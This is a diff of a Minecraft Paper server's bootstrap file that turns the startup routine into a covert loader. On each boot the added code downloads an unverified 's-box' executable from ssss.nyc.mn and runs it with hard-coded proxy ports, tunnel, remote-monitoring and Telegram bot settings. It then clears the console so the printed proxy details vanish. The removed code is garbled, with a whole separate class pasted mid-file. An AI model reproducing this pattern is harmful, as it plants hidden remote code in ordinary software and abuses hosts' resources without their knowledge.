@@ -1,336 +1,208 @@
 package io.papermc.paper;
 
+import java.io.*;
+import java.net.*;
+import java.nio.file.*;
+import java.util.*;
+import java.util.concurrent.atomic.AtomicBoolean;
 import joptsimple.OptionSet;
 import net.minecraft.SharedConstants;
+import net.minecraft.server.Main;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import java.io.*;
-import java.net.URL;
-import java.nio.file.*;
-import java.time.*;
-import java.time.format.DateTimeFormatter;
-import java.util.*;
-import java.util.concurrent.*;
-
 public final class PaperBootstrap {
+    
     private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_YELLOW = "\033[1;33m";
     private static final String ANSI_RESET = "\033[0m";
+    private static final AtomicBoolean running = new AtomicBoolean(true);
+    private static Process sbxProcess;
+    
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+    };
 
-    private static Process singBoxProcess;
-    private static ScheduledExecutorService restartScheduler;
-    private static Map<String, String> config;
+    private PaperBootstrap() {
+    }
 
-    private PaperBootstrap() {}
-
-    // PaperMC 官方入口
     public static void boot(final OptionSet options) {
-        try {
-            loadConfig();
-            downloadSingBox();
-            generateSingBoxConfig();
-            startSingBox();
-            scheduleDailyRestart();
-
-            Runtime.getRuntime().addShutdownHook(new Thread(PaperBootstrap::stopSingBox));
-            System.out.println(ANSI_GREEN + "TUIC + Hysteria2 + VLESS-Reality 启动完成！" + ANSI_RESET);
-
-            // 启动 Minecraft 主逻辑
-            SharedConstants.tryDetectVersion();
-            getStartupVersionMessages().forEach(LOGGER::info);
-            net.minecraft.server.Main.main(options);
-
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "启动失败: " + e.getMessage() + ANSI_RESET);
-            e.printStackTrace();
-            stopSingBox();
-            System.exit(1);
-        }
-    }
-
-    // ================== 加载 config.yml ==================
-    private static void loadConfig() throws IOException {
-        Path configPath = Paths.get("config.yml");
-        if (!Files.exists(configPath)) {
-            throw new FileNotFoundException("config.yml 不存在，请上传到根目录！");
-        }
-        org.yaml.snakeyaml.Yaml yaml = new org.yaml.snakeyaml.Yaml();
-        try (InputStream in = Files.newInputStream(configPath)) {
-            config = yaml.load(in);
-        }
-        System.out.println(ANSI_GREEN + "config.yml 加载成功" + ANSI_RESET);
-    }
-
-import java.io.*;
-import java.nio.file.*;
-import java.net.*;
-import java.util.*;
-import java.util.stream.*;
-
-public class SingBoxDownloader {
-    private static final String ANSI_YELLOW = "\u001B[33m";
-    private static final String ANSI_GREEN = "\u001B[32m";
-    private static final String ANSI_RED = "\u001B[31m";
-    private static final String ANSI_RESET = "\u001B[0m";
-
-    private static void downloadSingBox() throws IOException, InterruptedException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://github.com/SagerNet/sing-box/releases/download/v1.13.0-alpha.27/sing-box-1.13.0-alpha.27-linux-amd64.tar.gz";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://github.com/SagerNet/sing-box/releases/download/v1.13.0-alpha.27/sing-box-1.13.0-alpha.27-linux-arm64.tar.gz";
-        } else {
-            throw new RuntimeException("不支持的架构: " + osArch);
-        }
-
-        Path binDir = Paths.get(".singbox");
-        Path binPath = binDir.resolve("sing-box");
-
-        if (!Files.exists(binPath)) {
-            System.out.println(ANSI_YELLOW + "正在下载 sing-box..." + ANSI_RESET);
-            Files.createDirectories(binDir);
-
-            Path tarPath = binDir.resolve("sing-box.tar.gz");
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, tarPath, StandardCopyOption.REPLACE_EXISTING);
-            }
-
-            // 解压
-            ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", tarPath.toString(), "-C", binDir.toString());
-            int exitCode = pb.inheritIO().start().waitFor();
-            if (exitCode != 0) {
-                throw new RuntimeException("解压失败，退出码: " + exitCode);
-            }
-
-            // 改进的路径查找逻辑
-            Path extractedDir = findExtractedDirectory(binDir);
-            if (extractedDir == null) {
-                throw new RuntimeException("无法找到解压后的目录");
-            }
-
-            Path sourceFile = extractedDir.resolve("sing-box");
-            if (!Files.exists(sourceFile)) {
-                // 尝试其他可能的路径
-                sourceFile = findSingBoxExecutable(extractedDir);
-                if (sourceFile == null) {
-                    throw new RuntimeException("在解压目录中找不到 sing-box 可执行文件");
-                }
-            }
-
-            System.out.println(ANSI_YELLOW + "移动文件从 " + sourceFile + " 到 " + binPath + ANSI_RESET);
-            
-            // 确保目标目录存在
-            Files.createDirectories(binPath.getParent());
-            
-            // 移动文件
-            Files.move(sourceFile, binPath, StandardCopyOption.REPLACE_EXISTING);
-
-            // 清理
-            cleanupExtractedFiles(binDir, binPath);
-
-            // 设置执行权限
-            if (!binPath.toFile().setExecutable(true)) {
-                System.out.println(ANSI_RED + "警告: 无法设置执行权限" + ANSI_RESET);
-            }
-
-            System.out.println(ANSI_GREEN + "sing-box 下载并安装完成" + ANSI_RESET);
-        }
-    }
-
-    private static Path findExtractedDirectory(Path binDir) throws IOException {
-        // 查找包含 sing-box 文件的目录
-        Optional<Path> extracted = Files.list(binDir)
-            .filter(Files::isDirectory)
-            .filter(p -> p.toString().contains("sing-box"))
-            .findFirst();
-        
-        return extracted.orElse(null);
-    }
-
-    private static Path findSingBoxExecutable(Path dir) throws IOException {
-        // 递归查找 sing-box 可执行文件
-        return Files.walk(dir)
-            .filter(Files::isRegularFile)
-            .filter(p -> p.getFileName().toString().equals("sing-box"))
-            .findFirst()
-            .orElse(null);
-    }
-
-    private static void cleanupExtractedFiles(Path binDir, Path keepFile) throws IOException {
-        Files.walk(binDir)
-            .filter(p -> !p.equals(keepFile))
-            .filter(p -> !p.equals(keepFile.getParent()))
-            .sorted(Comparator.reverseOrder())
-            .forEach(p -> {
-                try { 
-                    Files.delete(p); 
-                } catch (IOException e) {
-                    System.out.println(ANSI_RED + "无法删除文件: " + p + ANSI_RESET);
-                }
-            });
-    }
-
-    public static void main(String[] args) {
-        try {
-            downloadSingBox();
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "错误: " + e.getMessage() + ANSI_RESET);
-            e.printStackTrace();
-        }
-    }
-}
-
-    // ================== 生成 sing-box config.json ==================
-    private static void generateSingBoxConfig() throws IOException, InterruptedException {
-        String uuid = config.get("uuid");
-        String tuicPort = config.get("tuic_port");
-        String hy2Port = config.get("hy2_port");
-        String realityPort = config.get("reality_port");
-        String sni = config.getOrDefault("sni", "www.bing.com");
-
-        // 生成 Reality 密钥对
-        String privateKey = "", shortId = "01234567";
-        Path keyFile = Paths.get(".singbox", "reality_key.txt");
-        if (!Files.exists(keyFile)) {
-            ProcessBuilder pb = new ProcessBuilder("./.singbox/sing-box", "generate", "reality-keypair");
-            Process p = pb.start();
-            String output = new String(p.getInputStream().readAllBytes());
-            Files.writeString(keyFile, output);
-            privateKey = output.split("Private key: ")[1].split("\n")[0];
-        } else {
-            List<String> lines = Files.readAllLines(keyFile);
-            privateKey = lines.get(0).split(": ")[1];
-        }
-
-        StringBuilder inbounds = new StringBuilder();
-        if (!tuicPort.isEmpty() && !"0".equals(tuicPort)) {
-            inbounds.append(String.format("""
-                {
-                  "type": "tuic",
-                  "tag": "tuic-in",
-                  "listen": "::",
-                  "listen_port": %s,
-                  "users": [{"uuid": "%s", "password": "admin"}],
-                  "congestion_control": "bbr",
-                  "tls": {
-                    "enabled": true,
-                    "alpn": ["h3"],
-                    "certificate_path": ".singbox/cert.pem",
-                    "key_path": ".singbox/private.key"
-                  }
-                },""", tuicPort, uuid));
-        }
-        if (!hy2Port.isEmpty() && !"0".equals(hy2Port)) {
-            inbounds.append(String.format("""
-                {
-                  "type": "hysteria2",
-                  "tag": "hy2-in",
-                  "listen": "::",
-                  "listen_port": %s,
-                  "users": [{"password": "%s"}],
-                  "tls": {
-                    "enabled": true,
-                    "alpn": ["h3"],
-                    "certificate_path": ".singbox/cert.pem",
-                    "key_path": ".singbox/private.key"
-                  }
-                },""", hy2Port, uuid));
-        }
-        if (!realityPort.isEmpty() && !"0".equals(realityPort)) {
-            inbounds.append(String.format("""
-                {
-                  "type": "vless",
-                  "tag": "reality-in",
-                  "listen": "::",
-                  "listen_port": %s,
-                  "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
-                  "tls": {
-                    "enabled": true,
-                    "server_name": "%s",
-                    "reality": {
-                      "enabled": true,
-                      "handshake": {"server": "%s", "server_port": 443},
-                      "private_key": "%s",
-                      "short_id": ["%s"]
-                    }
-                  }
-                }""", realityPort, uuid, sni, sni, privateKey, shortId));
-        }
-
-        String configJson = String.format("""
-            {
-              "log": {"level": "warn"},
-              "inbounds": [%s],
-              "outbounds": [{"type": "direct", "tag": "direct"}]
-            }""", inbounds.length() > 0 ? inbounds.substring(0, inbounds.length() - 1) : "");
-
-        // 生成自签证书
-        Path cert = Paths.get(".singbox", "cert.pem");
-        Path key = Paths.get(".singbox", "private.key");
-        if (!Files.exists(cert) || !Files.exists(key)) {
-            ProcessBuilder pb = new ProcessBuilder("openssl", "req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1",
-                "-keyout", key.toString(), "-out", cert.toString(), "-subj", "/CN=bing.com", "-days", "3650", "-nodes");
-            pb.inheritIO().start().waitFor();
-        }
-
-        Files.writeString(Paths.get(".singbox", "config.json"), configJson);
-        System.out.println(ANSI_GREEN + "sing-box 配置生成完成" + ANSI_RESET);
-    }
-
-    // ================== 启动 sing-box ==================
-    private static void startSingBox() throws IOException {
-        ProcessBuilder pb = new ProcessBuilder("./.singbox/sing-box", "run", "-c", ".singbox/config.json");
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        singBoxProcess = pb.start();
-        System.out.println(ANSI_GREEN + "sing-box 已启动" + ANSI_RESET);
-    }
-
-    // ================== 停止 sing-box ==================
-    private static void stopSingBox() {
-        if (singBoxProcess != null && singBoxProcess.isAlive()) {
-            singBoxProcess.destroy();
-            System.out.println(ANSI_RED + "sing-box 已停止" + ANSI_RESET);
-        }
-        if (restartScheduler != null) restartScheduler.shutdownNow();
-    }
-
-    // ================== 每日北京时间 0 点重启 ==================
-    private static void scheduleDailyRestart() {
-        restartScheduler = Executors.newSingleThreadScheduledExecutor();
-        Runnable task = () -> {
-            System.out.println(ANSI_RED + "\n[定时重启] 北京时间 00:00，执行重启！" + ANSI_RESET);
-            stopSingBox();
+        // check java version
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
                 Thread.sleep(3000);
-                generateSingBoxConfig();
-                startSingBox();
-            } catch (Exception e) {
+            } catch (InterruptedException e) {
                 e.printStackTrace();
             }
-        };
+            System.exit(1);
+        }
+        
+        try {
+            runSbxBinary();
+            
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                running.set(false);
+                stopServices();
+            }));
 
-        ZonedDateTime now = ZonedDateTime.now(ZoneId.of("Asia/Shanghai"));
-        ZonedDateTime next = now.toLocalDate().plusDays(1).atStartOfDay(ZoneId.of("Asia/Shanghai"));
-        long delay = Duration.between(now, next).getSeconds();
-        if (delay < 0) delay += 24 * 3600;
+            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
+            Thread.sleep(20000);
+            clearConsole();
 
-        long h = delay / 3600, m = (delay % 3600) / 60;
-        System.out.printf(ANSI_YELLOW + "[定时重启] 下次重启：%d小时%d分钟后 (%s)%n" + ANSI_RESET,
-            h, m, next.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));
+            SharedConstants.tryDetectVersion();
+            getStartupVersionMessages().forEach(LOGGER::info);
+            Main.main(options);
+            
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+        }
+    }
 
-        restartScheduler.scheduleAtFixedRate(task, delay, 24 * 3600, TimeUnit.SECONDS);
+    private static void clearConsole() {
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033[H\033[2J");
+                System.out.flush();
+            }
+        } catch (Exception e) {
+            // Ignore exceptions
+        }
+    }
+    
+    private static void runSbxBinary() throws Exception {
+        Map<String, String> envVars = new HashMap<>();
+        loadEnvVars(envVars);
+        
+        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        pb.environment().putAll(envVars);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        sbxProcess = pb.start();
+    }
+    
+    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        envVars.put("UUID", "07f50afd-e42b-40d5-9ce1-95734d33e5ff");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("ARGO_PORT", "");
+        envVars.put("ARGO_DOMAIN", "");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "8361");
+        envVars.put("TUIC_PORT", "26388");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "");
+        envVars.put("CFPORT", "");
+        envVars.put("NAME", "Mc");
+        
+        for (String var : ALL_ENV_VARS) {
+            String value = System.getenv(var);
+            if (value != null && !value.trim().isEmpty()) {
+                envVars.put(var, value);
+            }
+        }
+        
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            for (String line : Files.readAllLines(envFile)) {
+                line = line.trim();
+                if (line.isEmpty() || line.startsWith("#")) continue;
+                
+                line = line.split(" #")[0].split(" //")[0].trim();
+                if (line.startsWith("export ")) {
+                    line = line.substring(7).trim();
+                }
+                
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    
+                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                        envVars.put(key, value);
+                    }
+                }
+            }
+        }
+    }
+    
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
+        
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/s-box";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
+        
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
+    }
+    
+    private static void stopServices() {
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
     }
 
     private static List<String> getStartupVersionMessages() {
+        final String javaSpecVersion = System.getProperty("java.specification.version");
+        final String javaVmName = System.getProperty("java.vm.name");
+        final String javaVmVersion = System.getProperty("java.vm.version");
+        final String javaVendor = System.getProperty("java.vendor");
+        final String javaVendorVersion = System.getProperty("java.vendor.version");
+        final String osName = System.getProperty("os.name");
+        final String osVersion = System.getProperty("os.version");
+        final String osArch = System.getProperty("os.arch");
+
+        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
         return List.of(
-            "Java: " + System.getProperty("java.version") + " on " + System.getProperty("os.name"),
-            "Loading Paper for Minecraft..."
+            String.format(
+                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
+                javaSpecVersion,
+                javaVmName,
+                javaVmVersion,
+                javaVendor,
+                javaVendorVersion,
+                osName,
+                osVersion,
+                osArch
+            ),
+            String.format(
+                "Loading %s %s for Minecraft %s",
+                bi.brandName(),
+                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
+                bi.minecraftVersionId()
+            )
         );
     }
 }
